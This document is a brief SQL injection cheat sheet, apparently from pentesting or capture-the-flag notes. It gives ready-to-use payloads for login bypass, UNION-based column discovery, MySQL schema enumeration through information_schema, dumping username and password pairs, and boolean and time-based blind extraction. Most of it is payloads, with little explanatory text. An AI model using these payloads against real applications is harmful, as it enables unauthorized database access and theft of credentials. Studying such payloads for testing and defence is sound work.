# 1. SQL Injection  

SQL is how we talk to databases. SQL injection occurs when an application handles user input unsafely, letting an attacker manipulate the query's logic and run unintended database operations.

### Detection & Auth Bypass

```
' OR 1=1 -- 
' OR 1=1 #
admin' -- 
```

### Union-Based (Find Column Count)

```
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

### Find Visible Columns

```
0 UNION SELECT 1,2,3
```

_Using_ `_0_` _or_ `_-1_` _may prevent the original row from appearing, depending on the query and database contents._

### Database Enumeration (MySQL)

**Database Name**

```
0 UNION SELECT 1,2,database()
```

**Tables**

```
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()
```

**Columns**

```
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_schema=database()
AND table_name='TABLE_NAME'
```

**Data**

```
0 UNION SELECT 1,2,group_concat(username,0x3a,password)
FROM TABLE_NAME
```

_Tip:_ `_0x3a_` _is the hexadecimal representation of_ `_:_`_, which can be useful when handling special characters._

### Blind Extraction (MySQL)

**Boolean-Based**

```
admin123' AND SUBSTRING(database(),1,1)='s'-- 
```

**Time-Based**

```
admin123' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)-- 
```


Boolean-based extraction relies on differences in application responses. Time-based extraction relies on delays when a condition is true.
